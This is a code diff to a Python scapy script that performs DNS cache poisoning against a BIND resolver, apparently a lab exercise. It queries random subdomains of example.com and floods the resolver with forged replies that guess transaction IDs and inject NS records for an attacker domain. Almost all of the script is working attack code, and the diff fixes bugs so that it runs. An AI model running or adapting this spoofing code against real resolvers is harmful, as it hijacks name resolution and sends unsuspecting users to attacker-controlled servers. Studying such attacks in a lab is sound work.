@@ -48,35 +48,28 @@ Example code that sends a DNS query using scapy.
 def SendDNSQuery(sock, domain_name):
     dnsPacket = DNS(rd=1, qd=DNSQR(qname=domain_name))
     sendPacket(sock, dnsPacket, my_ip, my_port)
-    # response = sock.recv(4096)
-    # response = DNS(response)
-    # print ("\n***** Packet Received from Remote Server *****")
-    # print (response.show())
-    # print ("***** End of Remote Server Packet *****\n")
-
 
 if __name__ == '__main__':
     while True:
         # Generate a random domain name
-        domain_name = getRandomSubDomain() + 'example.com'
+        domain_name = getRandomSubDomain() + '.example.com'
         # Create the socket for the BIND
-        BIND_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        BIND_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
         # Query BIND for the random name
         SendDNSQuery(BIND_sock, domain_name)
         # Flood BIND with the sproofed DNS replies
-        spoof_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        qd = DNSQR(qname=domain_name, qtype='A')
+        an = DNSRR(rrname=domain_name, type='A', rdata="6.6.6.6", ttl=86400)
+        ns = DNSRR(rrname='example.com', type='NS', ttl=86400, rdata='ns1.spoof568attacker.net')/DNSRR(rrname='example.com', type='NS', ttl=86400, rdata='ns2.spoof568attacker.net')
         for i in range(250):
-            # Spoof the DNS packet
-            qd = DNSQR(qname=domain_name)
-            an = DNSRR(rrname=domain_name, type='A', rdata="6.6.6.6", ttl=68900)
-            ns = DNSRR(rrname='example.com', type='NS', ttl=86400, rdata='ns1.spoof568attacker.net')/DNSRR(rrname='example.com', type='NS', ttl=86400, rdata='ns2.spoof568attacker.net')
-            dnsPacket = DNS(id=getRandomTXID(), opcode='QUERY', qr=1L, aa=1L, tc=0L, rd=1L, ra=1L, z=0L, ad=0L, cd=0L, rcode='ok', qdcount=1, ancount=1, nscount=2, arcount=0, qd=qd, an=an, ns=ns)
+            # Spoof the DNS packet with the random id
+            dnsPacket = DNS(id=getRandomTXID(), aa=1, qr=1, qdcount=1, ancount=1, nscount=2, arcount=0, an=an, qd=qd, ns=ns)
             # Send the fake packet to BIND
-            sendPacket(spoof_sock, dnsPacket, my_ip, my_query_port)
-        # Check if the received packet has the new name server
+            sendPacket(BIND_sock, dnsPacket, my_ip, my_query_port)
+        # Check if the received packet has the new name servers
         packet = BIND_sock.recv(4096)
         packet = DNS(packet)
-        if packet.rcode == 'ok' and (packet.ns[0].rdata == 'ns1.spoof568attacker.net' or packet.ns[1].rdata == 'ns1.spoof568attacker.net'):
+        if packet.ns[0].rdata == 'ns1.spoof568attacker.net' or packet.ns[1].rdata == 'ns1.spoof568attacker.net':
             print("Success...")
             BIND_sock.close()
             exit()
